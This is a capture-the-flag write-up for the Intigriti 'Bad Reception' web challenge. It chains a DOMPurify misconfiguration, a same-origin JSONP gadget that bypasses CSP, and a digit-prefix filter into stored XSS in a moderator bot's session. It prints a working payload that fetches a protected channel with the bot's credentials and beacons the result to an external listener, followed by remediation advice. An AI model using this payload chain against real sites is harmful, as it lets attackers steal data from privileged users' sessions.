# Bad Reception — Intigriti CTF 0826

**Author:** grantzero  ·  **Event:** Intigriti CTF 0826 (August 2026)  ·  **Category:** Web / XSS

> **TL;DR** — Unauthenticated stored XSS executing inside a moderator bot's privileged session. Three stacked defenses — a DOMPurify sanitizer, a `script-src 'self'` CSP, and an input filter — each had a matching gap. A same-origin JSONP endpoint turned *"I can inject a `<script>` tag"* into *"I can run arbitrary JavaScript from the site's own origin."* The moderator's credentialed session then fetches the locked channel and beacons it back to me.

**Techniques:** DOMPurify `ADD_TAGS` misconfiguration · CSP `script-src 'self'` same-origin bypass · JSONP callback gadget · missing `X-Content-Type-Options: nosniff` / MIME execution · stored XSS via headless bot

> 📄 Prefer the styled version? [Download the PDF](./Bad_Reception_0826_writeup.pdf)

---

## Overview — a TV service with a channel you're not allowed to watch

"Bad Reception" is a streaming web app that mimics a broadcast TV service. Channels 1–10 play normally. Channel 11 returns `403 — channel not available`. The flag is broadcasting on channel 11.

The app also lets you *report* a channel: `POST /api/report` queues a channel ID that a headless-Chrome moderator bot then opens on an internal page. That bot holds the credentials an ordinary visitor lacks — including access to channel 11. So the whole challenge reduces to one question: **can I get my JavaScript to run inside the moderator's browser?** If I can, the bot fetches channel 11 for me and I exfiltrate the result.

Getting there means defeating three defenses stacked on top of each other — a sanitizer, a Content Security Policy, and an input filter — using the application's own endpoints against it. Here's the full path, including the wrong turn I took first.

## Recon — mapping a deliberately small attack surface

The API was compact, which meant every endpoint mattered:

```
GET  /api/channels/{n}/load    stream; 1–10 work, 11 returns 403 for anonymous users
POST /api/report               takes {"channelId":"…"}, queues it for the moderator bot
GET  /api/jsonp?callback=X     a JSONP endpoint (this turns out to be the key)
GET  /moderate/{id}            internal page the bot opens; renders the reported channelId into the DOM
```

The critical observation: `/moderate/{id}` renders my submitted `channelId` as HTML, inside the bot's authenticated session. That's a stored-XSS sink — *if* I can get past the sanitizer and the CSP that guard it. The only server-side validation on the input is that `channelId` must begin with a digit.

## Dead end — a CSS leak that went nowhere

Before I found the clean script path, I spent a report on a CSS-exfiltration idea. If the moderation page renders attacker HTML, a `<style>` block with `@import` plus `unicode-range` font descriptors can leak text one glyph at a time — each renderable character triggers a font fetch to a server I control, and the order of requests spells out the hidden content.

Submitted report `de43a9b83a99dda8` with a font-descriptor payload and watched my listener for nine minutes. The bot rendered the page. Zero callbacks. Whether the CSP blocked the external stylesheet fetch or the page simply didn't lay out the target text where my descriptors could see it, the result was the same — nothing leaked.

A dead end, but a useful one: it told me the sink was more locked-down than a naive CSS-injection challenge, and it pushed me back to the endpoint list. That's when `/api/jsonp` stopped looking like noise.

## The gadget — `/api/jsonp` is a same-origin script factory

I almost dismissed this endpoint. A grep through the bundled client JavaScript for `jsonp` returned nothing — but an endpoint missing from a local bundle says nothing about whether it's live on the server. So I probed it directly instead of trusting the grep:

```http
GET /api/jsonp?callback=PROOF_grantzero

HTTP/1.1 200 OK
Content-Type: application/javascript

/**/ PROOF_grantzero({"channels":10});
```

Three things about that response make it a weapon, not a feature:

- The callback is **reflected completely unvalidated** — whatever I pass comes back verbatim.
- It's served as **`application/javascript`**, so a browser will execute it as a script.
- There's **no `X-Content-Type-Options: nosniff`** header.

Point a `<script src>` at this URL and the browser runs my code — from the site's own origin.

## Three locks, three keys — why the exploit clears every defense

The moderation sink is guarded by three mechanisms. The exploit works because each one has a matching gap, and — critically — the same JSONP gadget unlocks two of them at once.

**1. The sanitizer allows `<script>`.** Submitted HTML is run through DOMPurify, but a bare `<script>` element survives and executes while inline `on*` handlers are stripped. That exact signature — script tags in, event handlers out — is DOMPurify configured with `ADD_TAGS:['script']`, which re-permits the one element it blocks by default. So the tag reaches the DOM intact.

**2. The CSP allows same-origin scripts.** The policy is `script-src 'self'`. That blocks inline scripts and every external host — but a `<script src="/api/jsonp?callback=…">` is same-origin, so it's explicitly permitted. The JSONP endpoint is what turns *"I can inject a script tag"* into *"I can run arbitrary JS,"* because it manufactures a same-origin script out of my input.

**3. The JSONP wrapper is neutralizable.** The response is `/**/ CALLBACK({"channels":10});` — my code, then a trailing function call I don't want. Ending my callback with `//` comments out everything after it. The browser runs my payload and treats the wrapper suffix as a dead comment.

> **The turn that mattered:** early on I'd half-convinced myself the CSP blocked all script execution, because my first inline attempts failed. But `script-src 'self'` blocks *inline* scripts, not *same-origin external* ones. Separating those two cases is the whole exploit.

## The chain — building the payload

The JavaScript I want the moderator to run fetches channel 11 with its credentials and beacons the response to my listener. The trailing `//` neutralizes the JSONP suffix:

```js
/**/ fetch('/api/channels/11/load', {credentials:'include'})
  .then(r => r.text().then(b => {
    new Image().src =
      'https://LISTENER/f11/TOKEN?s=' + r.status
      + '&b=' + encodeURIComponent(b)
  }))
  .catch(e => {
    new Image().src =
      'https://LISTENER/f11/TOKEN?err=' + encodeURIComponent(String(e))
  })//({"channels":10});   // ← wrapper suffix, commented out
```

That JavaScript is URL-encoded into the `callback` parameter, wrapped in a same-origin script tag, and prefixed with a digit to satisfy the input filter. The final value submitted as `channelId`:

```
1<script src="/api/jsonp?callback=fetch%28%27%2Fapi%2Fchannels%2F11%2Fload%27%2C%7Bcredentials%3A%27include%27%7D%29.then%28r%3D%3Er.text%28%29.then%28b%3D%3E%7Bnew%20Image%28%29.src%3D%27https%3A%2F%2FLISTENER%2Ff11%2FTOKEN%3Fs%3D%27%2Br.status%2B%27%26b%3D%27%2BencodeURIComponent%28b%29%7D%29%29.catch%28e%3D%3E%7Bnew%20Image%28%29.src%3D%27https%3A%2F%2FLISTENER%2Ff11%2FTOKEN%3Ferr%3D%27%2BencodeURIComponent%28String%28e%29%29%7D%29%2F%2F"></script>
```

The leading `1` passes validation, DOMPurify passes the `<script>` through, and the browser loads the JSONP URL as a same-origin script — which runs my code in the moderator's context.

## Execution — firing it, and one filter detail worth flagging

My listener was a small Python HTTP server behind a Cloudflare Quick Tunnel, so the moderator bot could reach a public URL that forwarded to my machine.

One snag on the way in, and it's a genuinely useful detail: the digit filter isn't a string check on the first character — it's **numeric**. A `channelId` starting with `0` was rejected with `400 "channel ID must start with a digit"`, while `1` was accepted. The server is parsing the leading number and validating it, so the prefix has to be a digit that reads as a valid channel. Prefix with `1`, not `0`.

Report submitted. Report ID `b84aba43631ef5b9`. Within about a minute, the bot bit:

```
[10:45:37] HIT: /f11/2ssvtmjr11?s=200&b=3b7c7029…aef7437.mp4
  STATUS : 200
  BODY   : 3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
  *** mp4 filename captured ***
```

The moderator's credentialed session hit channel 11, got back the secret stream's filename, and beaconed it to me. I downloaded the video from `/static/streams/3b7c7029…mp4` and played it.

## Flag

```
INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}
```

## Impact — why this is more than a flag

This is **unauthenticated stored XSS executing in a privileged internal context.** An attacker who never authenticates submits one report; a trusted moderator session then runs attacker-controlled JavaScript with its own credentials. In this challenge that unlocks channel 11, but the same primitive would let an attacker read any resource, action, or secret the moderator can reach — CSRF tokens, internal endpoints, session data — and exfiltrate it off-origin.

The root cause worth underlining is the JSONP endpoint: it converts the site's `script-src 'self'` CSP from a real mitigation into a formality. Any injection sink on the origin becomes arbitrary script execution, because the origin will hand out a same-origin script built from attacker input. The sanitizer misconfiguration opened the door; the JSONP gadget is what made walking through it trivial.

## Remediation — three fixes, in priority order

1. **Remove `ADD_TAGS:['script']` from the DOMPurify config** on the moderation page. User-submitted content has no legitimate reason to carry executable script elements; this single change closes the injection sink.
2. **Validate the JSONP callback** — restrict it to `[A-Za-z0-9_$.]` — or, better, retire JSONP entirely in favor of a normal JSON response with CORS. An unvalidated callback is a same-origin script gadget that defeats `script-src 'self'` for the whole application.
3. **Send `X-Content-Type-Options: nosniff` on all API responses**, especially any serving `application/javascript`, so responses can't be executed from unintended contexts.

---

*grantzero · Intigriti CTF 0826 · "Bad Reception"*
